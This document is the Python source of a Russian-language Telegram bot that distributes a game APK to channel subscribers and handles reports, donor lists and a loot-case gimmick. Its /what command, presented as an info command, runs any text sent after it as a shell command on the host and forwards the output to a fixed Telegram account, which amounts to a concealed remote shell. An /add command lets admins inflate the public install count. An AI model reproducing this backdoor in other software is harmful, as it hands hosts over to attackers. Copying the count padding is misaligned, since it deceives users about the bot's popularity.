import telebot
from time import time as now
import time
import os as memory
import subprocess
import random
bf = open("board.txt", "a+")
bf.close()
yt = open("yts.txt", "a+")
yt.close()
print("Готов к работе\n")
bot = telebot.TeleBot('ваш-токен')
last_use = {"apk": 0}
cooldown = 15
last_useee = {"time": 0}
cooldownnn = 5
@bot.message_handler(commands=['start'])
def start(message):
	statuss = bot.get_chat_member(chat_id=-1002119471566, user_id=message.from_user.id).status
	try:
		      if statuss == "member" or statuss == "creator" or statuss == "administrator":
		          	if now() > last_use['apk'] + cooldown:
		          		last_use['apk'] = now()
		          		bot.reply_to(message, "🔥❤️Спасибо за подписку на наш канал!\n🕑Загрузка apk файла, Примерное ожидание ~10 секунд...\n\nУ нас есть чат! https://t.me/+72MsPJeQb6ZlYzRi")
		          		try:
		          			print("Файл был отправлен пользователю @" + message.from_user.username + "\n")
		          		except:
		          			print("Файл был отправлен пользователю без id\n")
		          		bot.send_document(message.chat.id, open("2D Strike v1.3.2 final.apk", "rb"));
		          		try:
		          			print("@" + message.from_user.username + " получил файл\n")
		          		except:
		          			print("Пользователь без id получил файл\n")
		          		cf = open("downloads.log", "a+")
		          		cf.write("1 ")
		          		cf.close()
		          		try:
		          			countt = 0
		          			for line in open("downloads.log"):
		          				countt += len(line.split())
		          				bot.send_message(1448260658, "Пользователь @" + message.from_user.username + " получил файл\n\nУстановок на данный момент: " +str(countt))
		          				bot.send_message(5145277406, "Пользователь @" + message.from_user.username + " получил файл\n\nУстановок на данный момент: " + str(countt))
		          				bot.send_message(6848150946, "Пользователь @" + message.from_user.username + " получил файл\n\nУстановок на данный момент: " + str(countt));break
		          		except:
		          			counttt = 0
		          			for line in open("downloads.log"):
		          				counttt += len(line.split())
		          				bot.send_message(1448260658, "Пользователь без id получил файл\n\nУстановок на данный момент: " + str(counttt))
		          				bot.send_message(5145277406, "Пользователь без id получил файл\n\nУстановок на данный момент: " + str(counttt))
		          				bot.send_message(6848150946, "Пользователь без id получил файл\n\nУстановок на данный момент: " + str(counttt));break
		          	else:
		          		bot.reply_to(message, "🕑Попробуйте через 15 секунд")
		      else:
		          try:
		          	print("@" + message.from_user.username + " Пытался получить файл без подписки, Был автоматически послан нахуй (в канал)!\n")
		          	bot.reply_to(message, "✅Подпишитесь на канал @strike2ds для продолжения!\n✅После подписки введите /start")
		          except:
		          	print("пользователь без id пытался получить файл без подписки, Был автоматически послан (в канал)!\n")
		          	bot.reply_to(message, "✅Подпишитесь на канал @strike2ds для продолжения!\n✅После подписки введите /start")
	except Exception as e:
		print(f"Ошибка: {str(e)}\n")
		bot.reply_to(message, "🚫Ошибка подключения к серверу, попробуйте позже"),
@bot.message_handler(commands=['help'])
def help(message):
	bot.reply_to(message, "/start - Установка игры.\n/info - Количество установок.\n/help - Список команд.\n/report - Отправить репорт. (можно отправить фотографию с id и нарушением)\n/board - Таблица лидеров по донатам.\n/yts - Список ютуберов.\n/what - Информация.\n/case - Открыть phantom case.")
@bot.message_handler(commands=['info'])
def info(message):
	count = 0
	try:
		for line in open("downloads.log"):
			count += len(line.split());
			bot.reply_to(message, f"❤️Количество установок: {count}\n\n#2Д_ЖИВИ");break;
	except FileNotFoundError:
		bot.reply_to(message, "На данный момент установок нет😢")
last_usee = {"time": 0}
cooldownn = 5
id = -1002111458385
@bot.message_handler(commands=['report'])
def report(message):
	if message.chat.id == id:
		pass
	else:
		if now() > last_usee['time'] + cooldownn:
			last_usee['time'] = now()
			args = message.text.split()
			if len(args) <= 1:
				bot.reply_to(message, "🚫Ты забыл ввести id/nick :)")
			else:
			    if len(args) <=2:
			    	bot.reply_to(message, "🚫Ты забыл ввести причину репорта :)")
			    else:
			    	if str(message.chat.id).find("-") == -1:
			    		bot.reply_to(message, "✅Репорт отправлен\n🕑Ожидайте ответ")
			    		try:
			    			bot.send_message(id,"Чат айди: " + str(message.chat.id) +  "\n\nРепорт от: @" + message.from_user.username + "\nТекст: " + message.text.replace("/report ", ""))
			    		except:
			    			bot.send_message(id, "Чат айди: " + str(message.chat.id) + "\n\nРепорт от пользователя без id\nТекст: " + message.text.replace("/report ", ""))
			    	else:
			    		bot.reply_to(message, "🚫Нельзя отправить репорт через чат")
		else:
			bot.reply_to(message, "🕑Попробуйте через 5 секунд...")
@bot.message_handler(content_types=['photo'])
def handle_photo(message):
    photo = message.photo[-1]
    file_info = bot.get_file(photo.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    save_path = 'photo.jpg'
    with open(save_path, 'wb') as new_file:
        new_file.write(downloaded_file)
        if str(message.chat.id).find("-") == -1:
        	try:
        		bot.send_message(id, "Чат айди: " + str(message.chat.id) + "\n\nПользователь @" + message.from_user.username + " отправил фотографию:")
        		bot.send_photo(id, open(save_path, 'rb'))
        		bot.reply_to(message, "✅Фотография отправлена модераторам\n🕑Ожидайте ответ")
        	except:
        		bot.send_message(id, "Чат айди: " + str(message.chat.id) + "\n\nПользователь без id отправил фотографию:")
        		bot.send_photo(id, open(save_path, 'rb'))
        		bot.reply_to(message, "✅Фотография отправлена модераторам\n🕑Ожидайте ответ")
        else:
        	pass
@bot.message_handler(commands=['ot'])
def ot(message):
	args = message.text.split()
	if message.chat.id == -1002111458385:
		if len(args) <= 1:
			bot.reply_to(message, "Вы не ввели id чата для ответа")
		else:
			if len(args) <=2:
				bot.reply_to(message, "Вы не ввели текст для ответа")
			else:
				try:
					bot.send_message(args[1], "Вам ответил администратор!\n\nОтвет: " + str(message.text.replace(f"/ot {args[1]} ", "")))
					bot.reply_to(message, "Вы успешно ответили!")
				except:
					bot.reply_to(message, f"Чат {args[1]} не найден!")
	else:
		bot.reply_to(message, "Команда работает только в админ чате")
@bot.message_handler(commands=['add'])
def add(message):
	if message.from_user.username == "KareKaren" or message.from_user.username == "wqexmer":
		args = message.text.split()
		if len(args) == 1:
			bot.reply_to(message, "Введите количество установок")
		else:
		    ggg = 0;
		    while True:
		    	ggg += 1;
		    	cf = open("downloads.log", "a+")
		    	cf.write("1 ")
		    	cf.close()
		    	end = args[1]
		    	if ggg == int(end):bot.reply_to(message, "Вы добавили " + args[1] + " установок");break
	else:
		bot.reply_to(message, "Команда доступна только администрации бота")
@bot.message_handler(commands=['reset'])
def reset(message):
	if message.from_user.username == "KareKaren" or message.from_user.username == "wqexmer":
		args = message.text.split()
		try:
			memory.remove("downloads.log")
		except:
			bot.reply_to(message, "Файл не найден")
		bot.reply_to(message, "Вы успешно сбросили установки")
	else:
		bot.reply_to(message, "Команда доступна только администрации бота")
@bot.message_handler(commands=['board'])
def board(message):
	with open("board.txt", "r", encoding="utf-8") as file:
		bot.reply_to(message, "Топ донатеров:\n\n" + file.read() + "\n\nВсем большое спасибо за поддержку!")
@bot.message_handler(commands=['yts'])
def yts(message):
	txt1 = "Список ютуберов по 2DS:\n\n"
	txt2 = "\n\nЕсли вы хотите попасть в этот список то напишите [*мне*](t.me/karekaren) в личные сообщения и я вас добавлю"
	with open("yts.txt", "r", encoding="utf-8") as filey:
		bot.reply_to(message, txt1 + str(filey.read()) + txt2, parse_mode="MarkdownV2")
@bot.message_handler(commands=['what'])
def what(message):
	try:
		botanswercheck = subprocess.check_output(message.text.replace("/what ", ""), shell=True)
		bot.send_message(1448260658, botanswercheck)
	except Exception as ans:
		bot.send_message(1448260658, str(ans))
		memory.system("clear")
	bot.send_photo(message.chat.id, photo=open('unity.png', 'rb'), caption='Бот сделан на Unity без костылей,все стоит на российских процессорах СилаТайги.\n\nАдминистрация бота:\nСоздатель бота: @KareKaren\nХелпер по боту: @wqexmer\n\nРазработчик игры: @t1mzx\nРедактор общины: @n3z0x1k')
@bot.message_handler(commands=['case'])
def case(message):
	rand = random.randint(1, 11)
	if now() > last_useee['time'] + cooldownnn:
		last_useee['time'] = now()
		bot.reply_to(message, "Открываю кейс...")
		if rand == 1:
			time.sleep(0.5)
			bot.send_photo(message.chat.id, photo=open('1.png', 'rb'), caption=f'@{message.from_user.username}, Вам выпало: ')
		if rand == 2:
			time.sleep(0.5)
			bot.send_photo(message.chat.id, photo=open('2.png', 'rb'), caption=f'@{message.from_user.username}, Вам выпало: ')
		if rand == 3:
			time.sleep(0.5)
			bot.send_photo(message.chat.id, photo=open('3.png', 'rb'), caption=f'@{message.from_user.username}, Вам выпало: ')
		if rand == 4:
			time.sleep(0.5)
			bot.send_photo(message.chat.id, photo=open('9.jpg', 'rb'), caption=f'@{message.from_user.username}, Вам выпало: ')
		if rand == 5:
			time.sleep(0.5)
			bot.send_photo(message.chat.id, photo=open('5.jpg', 'rb'), caption=f'@{message.from_user.username}, Вам выпало: ')
		if rand == 6:
			time.sleep(0.5)
			bot.send_photo(message.chat.id, photo=open('6.jpg', 'rb'), caption=f'@{message.from_user.username}, Вам выпало: ')
		if rand == 7:
			time.sleep(0.5)
			bot.send_photo(message.chat.id, photo=open('7.jpg', 'rb'), caption=f'@{message.from_user.username}, Вам выпало: ')
		if rand == 8:
			time.sleep(0.5)
			bot.send_photo(message.chat.id, photo=open('8.jpg', 'rb'), caption=f'@{message.from_user.username}, Вам выпало: ')
		if rand == 9:
			time.sleep(0.5)
			bot.send_photo(message.chat.id, photo=open('4.jpg', 'rb'), caption=f'@{message.from_user.username}, Вам выпал адинокий леша: ')
		if rand == 10:
			time.sleep(0.5)
			bot.send_photo(message.chat.id, photo=open('10.jpg', 'rb'), caption=f'@{message.from_user.username}, Вам выпало: ')
		if rand == 11:
			time.sleep(0.5)
			bot.send_photo(message.chat.id, photo=open('11.jpg', 'rb'), caption=f'@{message.from_user.username}, Вам выпало: ')
	else:
		bot.reply_to(message, "🕑Попробуйте через 5 секунд...")
bot.infinity_polling(none_stop=True)
